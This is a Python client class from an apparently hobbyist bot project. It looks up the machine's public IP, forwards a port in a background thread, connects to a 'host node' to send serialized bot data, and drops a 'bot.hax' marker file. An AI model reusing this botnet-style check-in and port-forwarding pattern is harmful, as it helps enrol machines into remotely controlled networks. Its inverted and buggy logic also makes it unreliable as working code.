import socket
import sys
import os
import threading
import ipgetter
from src.common import common
from src.common import commonio
from src.bot import bot
from src.common.commondefs import false
from src.common.commondefs import true
from src.common.commondefs import none

class Client:
    def __init__(self, botRef: bot.Bot, remoteAddr, port):
        self.bot = bot.Bot

        if remoteAddr == "" or port == 0 or port is none or remoteAddr is none:
            self.port = port # Set host port for persistency
            self.hostNode = common.RemoteAddr # Set host node addr for persistency
        else:
            self.hostNode = remoteAddr
            self.port = 3000

        self.bot.host = botRef.host # Set host for persistency
        self.ip = ipgetter.myip() # Check IP

        if os.path.isfile('bot.hax') == false or botRef.host != self.ip:
            if botRef.host != self.ip: # Check for new IP
                self.bot.host = self.ip # Register new IP

            self.RegisterClient() # Register client
    
    def RegisterClient(self):
        print('\n-- INFO -- registering client...\n') # Log begin

        if self.hostNode == '': # Check for nil host node
            return 'invalid host node' # Return error
        
        try:
            portThread = threading.Thread(target=common.forwardPortStandard) # Init port thread
            portThread.daemon = true # Run as background thread
            portThread.start() # Start port forwarding thread
        except Exception as e:
            print(e) # Log found error

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket

        sock.connect((self.hostNode, self.port)) # Connect socket

        print('-- CONNECTION -- connecting to host node with bot address '+self.bot.host)

        bot = self.bot # Get reference to bot

        serialized = bot.params_to_bytes(bot) # Attempt to serialize

        print('serialized bot data')

        sock.sendall(serialized) # Send self bot reference

        print('attempted to send '+str(len(serialized))+' bits of data') # Log send

        sock.close() # Close socket

        print('successfully wrote '+str(len(serialized))+' bits of data') # Log success

        print('-- CONNECTION-- closing connection\n')

        f = open('bot.hax', 'w') # Open file

        f.write('despacito') # Write success